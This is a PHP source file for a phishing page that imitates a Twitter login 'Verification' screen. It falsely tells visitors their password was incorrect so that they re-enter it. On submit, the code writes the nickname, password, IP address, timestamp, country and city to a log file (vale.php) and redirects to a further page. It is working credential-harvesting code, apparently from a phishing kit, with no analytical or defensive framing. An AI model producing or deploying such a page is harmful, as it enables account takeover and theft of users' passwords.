<?php
    error_reporting(0);
    $username = $_GET['nick'];
    
    if($_POST){

        $password =  $_POST['password'];
		$password1 =  $_POST['password1'];
		  $sehir = $cek->city;
        $ip = $_SERVER['REMOTE_ADDR'];
		  $ulke = $cek->country;
  $sehir = $cek->city;
        date_default_timezone_set('Europe/Istanbul');
        $cur_time=date("d-m-Y H:i:s");
						    include('kaan.php');
        $file = fopen('vale.php', 'a');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>
<font color='red'>PARTİNDE KIZ YOKSA GELEMEM -KHONTKAR
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>


"); 

fclose($file);
echo '';
  
   header("Location: yavru.php?nick=$username");
}
?>


<html>
	
	<head>
		
		
		<title>Login on Twitter</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="shortcut icon" href="img/twitter.png" >
		<style>
			
			
			#yazı1
			{
				font-family:sans-serif;
				font-weight:bold;
				text-align:center;
				font-size:21px;
				
			}
			#textamca
			{
				width:375px;
				height:50px;
				font-size:large;
				border-bottom-color:	#F0F8FF;
				font-weight:350;
				padding-top:14px;
				padding-bottom:14px;
				padding-left:5px;
				background-color:	#F0F8FF;
				border-top-width:0px;
				border-left-width:0px;
				border-radius:3px;
				outline:none;
				    border-bottom-color:#A9A9A9;

				

			}
			
			
			
			#sifreamca
			{
				
				width:375px;
				height:50px;
			     
				font-size:large;
				border-bottom-color:#A9A9A9; 
				background-color:	#F0F8FF;
				border-right-color:none;
				border-left-color:white;
				font-weight:350;
				
				padding-left:5px;
				border-top-width:0px;
				border-left-width:0px;
				border-radius:3px;
				
				outline:none;
			}
			
			
			#buton
			{
				
				background-color:rgba(29,161,242,1.00);
				padding:13px 150px;
				border-radius:23px;
				color:white;
				font-size:larger;
				font-family:sans-serif;
				font-weight:bold;
				outline:none;
				border:none;
			}
			
			
			
			#frgt 
			{
				
				color:rgba(29,161,242,1.00);
				font-weight:300;
				text-align:center;
				border-bottom:none;
				text-decoration:none;
			}
	
			
			</style>
		
		
		
		
		
		
		
		
		</head>
	<body>
		
		
		
		
		<center>
		<br/>
		<img src="img/twitter.png" widht=50 height=50>
		<h1 id=yazı1> Verification</h1>
	<form action="" method="post">
		 <font color = FF0000>You entered your password incorrectly, please check and try again. If you do not know your password, you can renew your password from your twitter account.</font><br>
		 <br>

		<input type="password" id="sifreamca" placeholder="Password" name="password" required=""> <br/><br/>
		<input type="submit" id="buton" value="Continue">
		<br/> <br/>
		<a id=frgt href="https://twitter.com/account/begin_password_reset">Forgot password? · Sign up for Twitter </a>
		
		
		</center>
		</body>
	</html>